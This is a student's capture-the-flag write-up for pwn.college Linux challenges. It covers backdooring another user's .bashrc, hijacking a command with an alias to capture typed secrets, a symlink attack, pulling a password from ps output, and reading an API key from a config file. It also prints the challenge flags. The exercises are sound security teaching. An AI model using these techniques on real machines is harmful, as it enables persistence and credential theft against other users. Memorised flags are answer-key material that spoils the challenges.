
### Bashrc Backdoor

In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named `zardus`, with a home directory of `/home/zardus`. You, as the `hacker` user, have write access to his `.bashrc`, and `zardus` has read-access to `/flag`. The victim is simulated by the script `/challenge/victim`, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?

What I did: 
- `cd /home/zardus`
- `echo "cat /flag" >> .bashrc`
- Ran `/challenge/victim`
- This gave out the flag

flag: `pwn.college{QwsFslawFk7w03W7xwg2X-ZEvbJ.0VMzEzNxwyNwkzNyEzW}`

### Sniffing Input 

Your mission is to use your continued write access to Zardus's `.bashrc` to intercept this flag. Remember how you hijacked commands in the [Pondering PATH](https://pwn.college/linux-luminarium/path) module? Can you use that capability to hijack the `flag_checker`?


This is what the flag_checker file contained: 
```bash
#!/opt/pwn.college/bash

echo -n "Type the flag, victim: "
read -r candidate

echo 
if [ "$candidate" = "$(cat /flag)" ]; then
	echo "Correct!"
	exit 0
else
	echo "Incorrect!"
	exit 1
fi
```

What I did: 
- Created my own flag_checker
- Created an alias that runs my flag_checker script which is not the actual flag_checker script
- Run `/challenge/victim` to get the flag

`/home/zardus/.bashrc`:
```bash

### Alias 

alias flag_checker="bash /home/hacker/flag_checker"

```

`/home/hacker/flag_checker`:
```bash
echo -n "Type the flag, victim: "
read -r candidate
echo "\n$candidate"
echo 
if [ "$candidate" = "$(cat /flag)" ]; then
	echo "Correct!"
	# putting echo here would cause an error and won't show the flag as the hacker user doesn't have read permissions to /flag, better to just get the input flag after read
	exit 0
else
	echo "Incorrect!"
	exit 1
fi
```


flag: `pwn.college{YJtNDzuqXSN5OODAZvsUFogdJMS.0VNzEzNxwyNwkzNyEzW}`

### Overshared Directories 

In this challenge, for convenience, Zardus opened up his home directory:

```console
zardus@dojo:~$ chmod a+w /home/zardus
```

As you know, there are lots of sensitive files in that directory _such as `.bashrc`_! Can you replicate the previous attack with write access to `/home/zardus` instead of `/home/zardus/.bashrc`?

What did I do? :
- `rm /home/zardus/.bashrc`
- `echo "alias flag_checker='bash /home/hacker/flag_checker'" > /home/zardus/.bashrc`
- `/challenge/victim`

flag: `pwn.college{wBNZwRocFD3RXPvgE9EwmuvfFaV.0FM0EzNxwyNwkzNyEzW}`

### Tricky Linking 

In this challenge, when you run `/challenge/victim`, Zardus will add `cat /flag` to that list of commands:

```console
hacker@dojo:~$ /challenge/victim

Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout

hacker@dojo:~$
```

Recall from the previous level that, having write access to `/tmp/collab`, the `hacker` user can replace that `evil-commands.txt` file. Also remember from [Comprehending Commands](https://pwn.college/linux-luminarium/commands) that files can _link_ to other files. What happens if `hacker` replaces `evil-commands.txt` with a symbolic link to some sensitive file that `zardus` can write to? Chaos and shenanigans!

You _know_ the file to link to. Pull off the attack, and get `/flag` (which, for this level, Zardus can read again!).


Command used: 
`rm /tmp/collab/evil-commands.txt`
`ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt`
`/challenge/victim # to write cat /flag to bashrc`
`/challenge/victim # to trigger cat`

flag: `pwn.college{gRDnjihKpBi3dKvLsfdTamxM5qA.0VM0EzNxwyNwkzNyEzW}`

### Sniffing Process Arguments

That's what this challenge explores. Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use `sudo` (and, thus, to `sudo cat /flag`!). Steal the password, log in to Zardus' account (recall the `su` command from the [Untangling Users](https://pwn.college/linux-luminarium/users) module), and get that flag!


Command used: 
`ps aux`
`password = pw_1680526469`
`su zardus`
`sudo cat /flag`

flag: `pwn.college{U-jGB_TOoFV-8iwBF2JRvE49Nzs.0FOzEzNxwyNwkzNyEzW}`

### Snooping on Configurations

Afterwards, Zardus can easily refer to the API key. In this level, users can use a valid API key to get the flag:

```
zardus@dojo:~$ flag_getter --key $FLAG_GETTER_API_KEY
Correct API key! Do you want me to print the key (y/n)? y
pwn.college{HACKED}
zardus@dojo:~$
```

Naturally, Zardus stores his key in `.bashrc`. Can you steal the key and get the flag?

Command used: 
`cat /home/zardus/.bashrc`
`flag_getter --key sk-4821690`


flag: `pwn.college{sZH97VUtd8C9mXW5x7xI_CZniBo.0lM0EzNxwyNwkzNyEzW}`


